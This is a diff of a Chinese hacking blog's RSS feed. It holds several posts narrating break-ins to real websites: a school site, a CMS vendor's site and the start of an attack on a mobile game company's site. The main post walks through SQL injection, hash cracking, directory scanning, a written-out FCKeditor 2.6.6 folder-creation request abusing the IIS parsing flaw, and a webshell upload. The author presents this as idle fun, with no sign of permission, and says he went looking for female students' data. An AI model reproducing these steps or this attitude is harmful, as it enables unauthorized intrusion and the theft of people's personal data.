+&lt;p&gt;又翻了翻，发现这个，点击检索&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://360rce.github.io/p/xaef7i9f/37.png&#34;
+	width=&#34;1090&#34;
+	height=&#34;150&#34;
+	srcset=&#34;https://360rce.github.io/p/xaef7i9f/37_hu5c14b260f09b87e43f175ef7e1a35ed8_7251_480x0_resize_box_3.png 480w, https://360rce.github.io/p/xaef7i9f/37_hu5c14b260f09b87e43f175ef7e1a35ed8_7251_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;意外性的发现一套cms的注入漏洞&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;726&#34;
+		data-flex-basis=&#34;1744px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://360rce.github.io/p/xaef7i9f/38.png&#34;
+	width=&#34;296&#34;
+	height=&#34;139&#34;
+	srcset=&#34;https://360rce.github.io/p/xaef7i9f/38_hua1b89238148871cf548074b017dc3e0c_3329_480x0_resize_box_3.png 480w, https://360rce.github.io/p/xaef7i9f/38_hua1b89238148871cf548074b017dc3e0c_3329_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;意外性的发现一套cms的注入漏洞&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;212&#34;
+		data-flex-basis=&#34;511px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;看到刚才上传的文件，点击源文件&lt;/p&gt;
+&lt;p&gt;路径变成了，多了个下划线…….&lt;/p&gt;
+&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;http://www.xxx.com/data/upload/2017-04/08215611_edit._php&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;http://www.xxx.com/data/upload/2017-04/08215611_edit._php&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;这个问题卡了我两天，各种姿势都试了，还是没办法绕过。&lt;/p&gt;
+&lt;p&gt;所以放弃了。。。。。&lt;/p&gt;
+&lt;p&gt;Ps：这个提供这套cms的站点也存在该漏洞&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://360rce.github.io/p/xaef7i9f/39.png&#34;
+	width=&#34;1607&#34;
+	height=&#34;703&#34;
+	srcset=&#34;https://360rce.github.io/p/xaef7i9f/39_hu035a9778f051d1329b0843da8601f031_309455_480x0_resize_box_3.png 480w, https://360rce.github.io/p/xaef7i9f/39_hu035a9778f051d1329b0843da8601f031_309455_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;意外性的发现一套cms的注入漏洞&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;228&#34;
+		data-flex-basis=&#34;548px&#34;
+	
+&gt;&lt;/p&gt;</description>
+        </item>
+        <item>
+        <title>毫无技术含量的一次渗透</title>
+        <link>https://360rce.github.io/p/6gkds72h/</link>
+        <pubDate>Wed, 01 Nov 2017 11:18:14 +0000</pubDate>
+        
+        <guid>https://360rce.github.io/p/6gkds72h/</guid>
+        <description>&lt;img src="https://w.wallhaven.cc/full/l8/wallhaven-l8d8my.png" alt="Featured image of post 毫无技术含量的一次渗透" /&gt;&lt;p&gt;马上就双十一了，发一篇去年双十一写的文章！图片太多，懒得打码了，一年过去了，漏洞没补也不怪我了吧。。。&lt;/p&gt;
+&lt;p&gt;事情是这样的，双十一大家都知道，有钱的都在买东西，没钱的都在借钱买东西。像我这种又丑又没钱的只能在聊 QQ……无意间在一个群里看到&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://360rce.github.io/p/6gkds72h/01.png&#34;
+	width=&#34;669&#34;
+	height=&#34;896&#34;
+	srcset=&#34;https://360rce.github.io/p/6gkds72h/01_hu6cd1174c7006e97a443410a3594fe2c1_453106_480x0_resize_box_3.png 480w, https://360rce.github.io/p/6gkds72h/01_hu6cd1174c7006e97a443410a3594fe2c1_453106_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;毫无技术含量的一次渗透&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;74&#34;
+		data-flex-basis=&#34;179px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://360rce.github.io/p/6gkds72h/02.png&#34;
+	width=&#34;723&#34;
+	height=&#34;432&#34;
+	srcset=&#34;https://360rce.github.io/p/6gkds72h/02_hu406c89201797356f73e60204bc2224a1_16160_480x0_resize_box_3.png 480w, https://360rce.github.io/p/6gkds72h/02_hu406c89201797356f73e60204bc2224a1_16160_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;毫无技术含量的一次渗透&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;167&#34;
+		data-flex-basis=&#34;401px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;反正无聊，随手打开看看吧。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://360rce.github.io/p/6gkds72h/03.png&#34;
+	width=&#34;1285&#34;
+	height=&#34;835&#34;
+	srcset=&#34;https://360rce.github.io/p/6gkds72h/03_hub48e899e70a86dbe97fd7c9a51489237_832104_480x0_resize_box_3.png 480w, https://360rce.github.io/p/6gkds72h/03_hub48e899e70a86dbe97fd7c9a51489237_832104_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;毫无技术含量的一次渗透&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;153&#34;
+		data-flex-basis=&#34;369px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;看起来是个学校网站啊。说不定有妹子的资料啥的。看到那哥们说有马啥的。我就去打开链接看了看。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://360rce.github.io/p/6gkds72h/04.png&#34;
+	width=&#34;1220&#34;
+	height=&#34;430&#34;
+	srcset=&#34;https://360rce.github.io/p/6gkds72h/04_hua5ecc0e6e498ddeb980e579e10ed3211_250517_480x0_resize_box_3.png 480w, https://360rce.github.io/p/6gkds72h/04_hua5ecc0e6e498ddeb980e579e10ed3211_250517_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;毫无技术含量的一次渗透&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;283&#34;
+		data-flex-basis=&#34;680px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://360rce.github.io/p/6gkds72h/05.png&#34;
+	width=&#34;1386&#34;
+	height=&#34;518&#34;
+	srcset=&#34;https://360rce.github.io/p/6gkds72h/05_hua6fb6dcbc79985a18787e4100f1cd3a6_373058_480x0_resize_box_3.png 480w, https://360rce.github.io/p/6gkds72h/05_hua6fb6dcbc79985a18787e4100f1cd3a6_373058_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;毫无技术含量的一次渗透&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;267&#34;
+		data-flex-basis=&#34;642px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://360rce.github.io/p/6gkds72h/06.png&#34;
+	width=&#34;1386&#34;
+	height=&#34;399&#34;
+	srcset=&#34;https://360rce.github.io/p/6gkds72h/06_huf2d0214f5b686e7e9080e7902f0f6ce0_248606_480x0_resize_box_3.png 480w, https://360rce.github.io/p/6gkds72h/06_huf2d0214f5b686e7e9080e7902f0f6ce0_248606_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;毫无技术含量的一次渗透&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;347&#34;
+		data-flex-basis=&#34;833px&#34;
+	
+&gt;
+好好好，你赢了，这都是啥屌东西啊~不过还真找到一个 d.asp 的马&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://360rce.github.io/p/6gkds72h/07.png&#34;
+	width=&#34;1386&#34;
+	height=&#34;773&#34;
+	srcset=&#34;https://360rce.github.io/p/6gkds72h/07_hu6adc522b3adb1544b1e51d2d45868711_217952_480x0_resize_box_3.png 480w, https://360rce.github.io/p/6gkds72h/07_hu6adc522b3adb1544b1e51d2d45868711_217952_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;毫无技术含量的一次渗透&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;179&#34;
+		data-flex-basis=&#34;430px&#34;
+	
+&gt;
+先看看这马能不能溢出吧，毕竟别人的 shell 为啥不能占为己有呢&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://360rce.github.io/p/6gkds72h/08.png&#34;
+	width=&#34;1386&#34;
+	height=&#34;482&#34;
+	srcset=&#34;https://360rce.github.io/p/6gkds72h/08_hu07ad05ea6aceeeb96fa0b780c55c30a9_216091_480x0_resize_box_3.png 480w, https://360rce.github.io/p/6gkds72h/08_hu07ad05ea6aceeeb96fa0b780c55c30a9_216091_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;毫无技术含量的一次渗透&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;287&#34;
+		data-flex-basis=&#34;690px&#34;
+	
+&gt;
+………溢出失败，还是别偷懒吧，一步步来。回到首页，随便打开一个链接。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://360rce.github.io/p/6gkds72h/09.png&#34;
+	width=&#34;1386&#34;
+	height=&#34;820&#34;
+	srcset=&#34;https://360rce.github.io/p/6gkds72h/09_hu78a3519af31b5a5f86c4ad99d184a79b_814344_480x0_resize_box_3.png 480w, https://360rce.github.io/p/6gkds72h/09_hu78a3519af31b5a5f86c4ad99d184a79b_814344_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;毫无技术含量的一次渗透&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;169&#34;
+		data-flex-basis=&#34;405px&#34;
+	
+&gt;
+直觉告诉我，这屌地方有注入啊，加个‘试试。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://360rce.github.io/p/6gkds72h/10.png&#34;
+	width=&#34;1386&#34;
+	height=&#34;513&#34;
+	srcset=&#34;https://360rce.github.io/p/6gkds72h/10_hu13616192fded53a235ef0fe96e6958a4_565885_480x0_resize_box_3.png 480w, https://360rce.github.io/p/6gkds72h/10_hu13616192fded53a235ef0fe96e6958a4_565885_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;毫无技术含量的一次渗透&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;270&#34;
+		data-flex-basis=&#34;648px&#34;
+	
+&gt;
+果然，报错了…..我也不装逼什么的手工注入了。果断丢进啊 d 神器中，毕竟还要去看片（正经片）。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://360rce.github.io/p/6gkds72h/11.png&#34;
+	width=&#34;1386&#34;
+	height=&#34;1101&#34;
+	srcset=&#34;https://360rce.github.io/p/6gkds72h/11_huc26c8ba46191181f6e445862866f45b2_408818_480x0_resize_box_3.png 480w, https://360rce.github.io/p/6gkds72h/11_huc26c8ba46191181f6e445862866f45b2_408818_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;毫无技术含量的一次渗透&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;125&#34;
+		data-flex-basis=&#34;302px&#34;
+	
+&gt;
+出来了，丢到 cmd5 去解密看看&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://360rce.github.io/p/6gkds72h/12.png&#34;
+	width=&#34;1386&#34;
+	height=&#34;576&#34;
+	srcset=&#34;https://360rce.github.io/p/6gkds72h/12_hu30e8830cbca0627439e9f98eb885b55a_22032_480x0_resize_box_3.png 480w, https://360rce.github.io/p/6gkds72h/12_hu30e8830cbca0627439e9f98eb885b55a_22032_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;毫无技术含量的一次渗透&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;240&#34;
+		data-flex-basis=&#34;577px&#34;
+	
+&gt;
+穷逼买不起….竟然买不起就先找后台吧….找到以后再借钱去买吧…..
+Admin 404&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://360rce.github.io/p/6gkds72h/13.png&#34;
+	width=&#34;1386&#34;
+	height=&#34;1225&#34;
+	srcset=&#34;https://360rce.github.io/p/6gkds72h/13_hu84d0ddcfa215504a8aa591a442b74cc0_128506_480x0_resize_box_3.png 480w, https://360rce.github.io/p/6gkds72h/13_hu84d0ddcfa215504a8aa591a442b74cc0_128506_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;毫无技术含量的一次渗透&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;113&#34;
+		data-flex-basis=&#34;271px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;Login.asp 也是 404，算了，用御剑扫扫吧。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://360rce.github.io/p/6gkds72h/14.png&#34;
+	width=&#34;1386&#34;
+	height=&#34;1016&#34;
+	srcset=&#34;https://360rce.github.io/p/6gkds72h/14_hu59abf12adf9a745703e3543fe7de407c_315687_480x0_resize_box_3.png 480w, https://360rce.github.io/p/6gkds72h/14_hu59abf12adf9a745703e3543fe7de407c_315687_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;毫无技术含量的一次渗透&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;136&#34;
+		data-flex-basis=&#34;327px&#34;
+	
+&gt;
+看到前 3 条，有 fck 编辑器。那还是从这下手吧，毕竟能省下解密的钱。
+看了下版本，是 2.6.6 的&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://360rce.github.io/p/6gkds72h/15.png&#34;
+	width=&#34;1386&#34;
+	height=&#34;478&#34;
+	srcset=&#34;https://360rce.github.io/p/6gkds72h/15_huf7139a212fba56b09511b073073083cf_220648_480x0_resize_box_3.png 480w, https://360rce.github.io/p/6gkds72h/15_huf7139a212fba56b09511b073073083cf_220648_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;毫无技术含量的一次渗透&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;289&#34;
+		data-flex-basis=&#34;695px&#34;
+	
+&gt;
+2.6.6 版本的 fck 的上传页面&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://360rce.github.io/p/6gkds72h/16.png&#34;
+	width=&#34;1050&#34;
+	height=&#34;176&#34;
+	srcset=&#34;https://360rce.github.io/p/6gkds72h/16_hu3319433580c908f49795c1edeba78069_2916_480x0_resize_box_3.png 480w, https://360rce.github.io/p/6gkds72h/16_hu3319433580c908f49795c1edeba78069_2916_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;毫无技术含量的一次渗透&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;596&#34;
+		data-flex-basis=&#34;1431px&#34;
+	
+&gt;
+Ok，先来看看第一个&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://360rce.github.io/p/6gkds72h/17.png&#34;
+	width=&#34;1386&#34;
+	height=&#34;733&#34;
+	srcset=&#34;https://360rce.github.io/p/6gkds72h/17_hufad189f36d20a7569b605706946979f0_329481_480x0_resize_box_3.png 480w, https://360rce.github.io/p/6gkds72h/17_hufad189f36d20a7569b605706946979f0_329481_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;毫无技术含量的一次渗透&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;189&#34;
+		data-flex-basis=&#34;453px&#34;
+	
+&gt;
+先查看下目录和文件&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://360rce.github.io/p/6gkds72h/18.png&#34;
+	width=&#34;1386&#34;
+	height=&#34;306&#34;
+	srcset=&#34;https://360rce.github.io/p/6gkds72h/18_hufdc712a430677a167110028f536c0642_17128_480x0_resize_box_3.png 480w, https://360rce.github.io/p/6gkds72h/18_hufdc712a430677a167110028f536c0642_17128_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;毫无技术含量的一次渗透&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;452&#34;
+		data-flex-basis=&#34;1087px&#34;
+	
+&gt;
+当前目录下什么都没有啊
+然后随便上传一张图片看下能否上传吧。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://360rce.github.io/p/6gkds72h/19.png&#34;
+	width=&#34;1386&#34;
+	height=&#34;501&#34;
+	srcset=&#34;https://360rce.github.io/p/6gkds72h/19_hu23728c1bbde94362be0f542bd562f294_238295_480x0_resize_box_3.png 480w, https://360rce.github.io/p/6gkds72h/19_hu23728c1bbde94362be0f542bd562f294_238295_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;毫无技术含量的一次渗透&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;276&#34;
+		data-flex-basis=&#34;663px&#34;
+	
+&gt;
+显示上传没有错误，那就是成功了啊！！！查看下&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://360rce.github.io/p/6gkds72h/20.png&#34;
+	width=&#34;1386&#34;
+	height=&#34;480&#34;
+	srcset=&#34;https://360rce.github.io/p/6gkds72h/20_hud50338e5b9ba28b459b440734b48dc4b_22638_480x0_resize_box_3.png 480w, https://360rce.github.io/p/6gkds72h/20_hud50338e5b9ba28b459b440734b48dc4b_22638_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;毫无技术含量的一次渗透&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;288&#34;
+		data-flex-basis=&#34;693px&#34;
+	
+&gt;
+果然多出了一张图片，看来会自动重命名了，先访问试试&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://360rce.github.io/p/6gkds72h/21.png&#34;
+	width=&#34;1386&#34;
+	height=&#34;951&#34;
+	srcset=&#34;https://360rce.github.io/p/6gkds72h/21_hu5f095c9681d8397ea93f242c6f9ddeee_294443_480x0_resize_box_3.png 480w, https://360rce.github.io/p/6gkds72h/21_hu5f095c9681d8397ea93f242c6f9ddeee_294443_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;毫无技术含量的一次渗透&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;145&#34;
+		data-flex-basis=&#34;349px&#34;
+	
+&gt;
+可以正常访问的，然后嘛，各种截断都没用&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://360rce.github.io/p/6gkds72h/22.png&#34;
+	width=&#34;141&#34;
+	height=&#34;132&#34;
+	srcset=&#34;https://360rce.github.io/p/6gkds72h/22_huf9b5cd59fe9a11d95ec1def13ac7e053_6592_480x0_resize_box_3.png 480w, https://360rce.github.io/p/6gkds72h/22_huf9b5cd59fe9a11d95ec1def13ac7e053_6592_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;毫无技术含量的一次渗透&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;106&#34;
+		data-flex-basis=&#34;256px&#34;
+	
+&gt;
+去查看服务器信息吧…&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://360rce.github.io/p/6gkds72h/23.png&#34;
+	width=&#34;778&#34;
+	height=&#34;104&#34;
+	srcset=&#34;https://360rce.github.io/p/6gkds72h/23_hu8b04f8e67c5e998c7f64fa5258e00eef_3810_480x0_resize_box_3.png 480w, https://360rce.github.io/p/6gkds72h/23_hu8b04f8e67c5e998c7f64fa5258e00eef_3810_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;毫无技术含量的一次渗透&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;748&#34;
+		data-flex-basis=&#34;1795px&#34;
+	
+&gt;
+那就上解析漏洞吧
+创建一个 ice.asp 的文件夹&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://360rce.github.io/p/6gkds72h/24.png&#34;
+	width=&#34;749&#34;
+	height=&#34;464&#34;
+	srcset=&#34;https://360rce.github.io/p/6gkds72h/24_hu46475829835da5e380d16ddd74f064c6_22729_480x0_resize_box_3.png 480w, https://360rce.github.io/p/6gkds72h/24_hu46475829835da5e380d16ddd74f064c6_22729_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;毫无技术含量的一次渗透&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;161&#34;
+		data-flex-basis=&#34;387px&#34;
+	
+&gt;
+我擦，变下划线了&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://360rce.github.io/p/6gkds72h/25.png&#34;
+	width=&#34;1386&#34;
+	height=&#34;601&#34;
+	srcset=&#34;https://360rce.github.io/p/6gkds72h/25_hu146635f31bc18d90ce2187c16d755ba7_27990_480x0_resize_box_3.png 480w, https://360rce.github.io/p/6gkds72h/25_hu146635f31bc18d90ce2187c16d755ba7_27990_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;毫无技术含量的一次渗透&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;230&#34;
+		data-flex-basis=&#34;553px&#34;
+	
+&gt;
+淡定，我记得这个是可以突破的….
+构造下语句&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;  FCKeditor/editor/filemanager/connectors/asp/connector.asp?Command=CreateFolder&amp;amp;Type=File&amp;amp;CurrentFolder=/ice.asp&amp;amp;NewFolderName=x.asp&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://360rce.github.io/p/6gkds72h/26.png&#34;
+	width=&#34;1386&#34;
+	height=&#34;516&#34;
+	srcset=&#34;https://360rce.github.io/p/6gkds72h/26_hu93ee45e15c43f893d67098b9edf899ce_373498_480x0_resize_box_3.png 480w, https://360rce.github.io/p/6gkds72h/26_hu93ee45e15c43f893d67098b9edf899ce_373498_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;毫无技术含量的一次渗透&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;268&#34;
+		data-flex-basis=&#34;644px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;成功建立了
+亮出我们的一句话&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://360rce.github.io/p/6gkds72h/27.png&#34;
+	width=&#34;1386&#34;
+	height=&#34;422&#34;
+	srcset=&#34;https://360rce.github.io/p/6gkds72h/27_hu11c7d71486341139dc0b6948601c332a_330081_480x0_resize_box_3.png 480w, https://360rce.github.io/p/6gkds72h/27_hu11c7d71486341139dc0b6948601c332a_330081_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;毫无技术含量的一次渗透&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;328&#34;
+		data-flex-basis=&#34;788px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://360rce.github.io/p/6gkds72h/28.png&#34;
+	width=&#34;1386&#34;
+	height=&#34;446&#34;
+	srcset=&#34;https://360rce.github.io/p/6gkds72h/28_hue2418b7da65db0beb95a65224ba3edf4_268341_480x0_resize_box_3.png 480w, https://360rce.github.io/p/6gkds72h/28_hue2418b7da65db0beb95a65224ba3edf4_268341_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;毫无技术含量的一次渗透&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;310&#34;
+		data-flex-basis=&#34;745px&#34;
+	
+&gt;
+上传成功，查看下文件&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://360rce.github.io/p/6gkds72h/29.png&#34;
+	width=&#34;1386&#34;
+	height=&#34;569&#34;
+	srcset=&#34;https://360rce.github.io/p/6gkds72h/29_hu616d8a0a57f84e1e9f5e59395b5db73e_28377_480x0_resize_box_3.png 480w, https://360rce.github.io/p/6gkds72h/29_hu616d8a0a57f84e1e9f5e59395b5db73e_28377_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;毫无技术含量的一次渗透&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;243&#34;
+		data-flex-basis=&#34;584px&#34;
+	
+&gt;
+构造下路径访问&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://360rce.github.io/p/6gkds72h/30.png&#34;
+	width=&#34;1386&#34;
+	height=&#34;702&#34;
+	srcset=&#34;https://360rce.github.io/p/6gkds72h/30_hu4c589a6937eb55182e11981469e27657_391617_480x0_resize_box_3.png 480w, https://360rce.github.io/p/6gkds72h/30_hu4c589a6937eb55182e11981469e27657_391617_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;毫无技术含量的一次渗透&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;197&#34;
+		data-flex-basis=&#34;473px&#34;
+	
+&gt;
+来啊，互相伤害啊&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://360rce.github.io/p/6gkds72h/31.png&#34;
+	width=&#34;1386&#34;
+	height=&#34;619&#34;
+	srcset=&#34;https://360rce.github.io/p/6gkds72h/31_hub2d367e5bd3efa3ee8bfd7d2b31a472d_118109_480x0_resize_box_3.png 480w, https://360rce.github.io/p/6gkds72h/31_hub2d367e5bd3efa3ee8bfd7d2b31a472d_118109_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;毫无技术含量的一次渗透&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;223&#34;
+		data-flex-basis=&#34;537px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;突然想到，这种站怎么可能会有妹子资料，算了算了，提不起兴趣了。删马走人…….
+此文没有任何技术含量。只是双十一屌丝蛋疼打发时间而已！！勿喷&lt;/p&gt;</description>
+        </item>
+        <item>
+        <title>陪妹子玩游戏引起的风波</title>
+        <link>https://360rce.github.io/p/j5i17p4f/</link>
+        <pubDate>Tue, 17 Oct 2017 14:17:06 +0000</pubDate>
+        
+        <guid>https://360rce.github.io/p/j5i17p4f/</guid>
+        <description>&lt;img src="https://w.wallhaven.cc/full/we/wallhaven-wex6pr.png" alt="Featured image of post 陪妹子玩游戏引起的风波" /&gt;&lt;h3 id=&#34;起因&#34;&gt;起因&lt;/h3&gt;
+&lt;p&gt;十月一回家和表弟还有他女票在一起玩的时候(当然，还有我女票也一起，别问我女票哪来的)，四个人刚好可以凑一桌麻将，表弟的女朋友说叫我们一起打黑桃4，黑桃4是我们家乡的一种打法。。。。
+然后发了我一个app，我安装以后打开一看。
+&lt;img src=&#34;https://360rce.github.io/p/j5i17p4f/01.png&#34;
+	width=&#34;1268&#34;
+	height=&#34;714&#34;
+	srcset=&#34;https://360rce.github.io/p/j5i17p4f/01_hu33ccfc55fb44aecd6010c58a5ddef336_997155_480x0_resize_box_3.png 480w, https://360rce.github.io/p/j5i17p4f/01_hu33ccfc55fb44aecd6010c58a5ddef336_997155_1024x0_resize_box_3.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;陪妹子玩游戏引起的风波&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;177&#34;
+		data-flex-basis=&#34;426px&#34;
+	
+&gt;
+卧槽，XXXX四个大字出现在我眼前
+不过此时心思并不在游戏上，这个叫XXXX的肯定有个官网吧。(事情到此结束，十月一回家电脑没带回去&amp;hellip;..)
+祖国的生日结束以后&amp;hellip;..又回到了学校，打开百度搜了下这个xxxx，找到了他官网: &lt;a class=&#34;link&#34; href=&#34;http://xxxx.com/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;http://xxxx.com/&lt;/a&gt;。&lt;/p&gt;
+&lt;h3 id=&#34;踩点&#34;&gt;踩点&lt;/h3&gt;
+&lt;p&gt;简单的搜集了下信息如下:
+IP: XXX.XXX.XX.XX
+旁站:无
+cdn:无
+脚本:php
+中间件:nginx
+框架:ThinkPHP
+cms:vlcms&lt;/p&gt;
+&lt;p&gt;可以判断出服务器架构是:php+mysql+nginx+linux&lt;/p&gt;
+&lt;h3 id=&#34;进后台&#34;&gt;进后台&lt;/h3&gt;
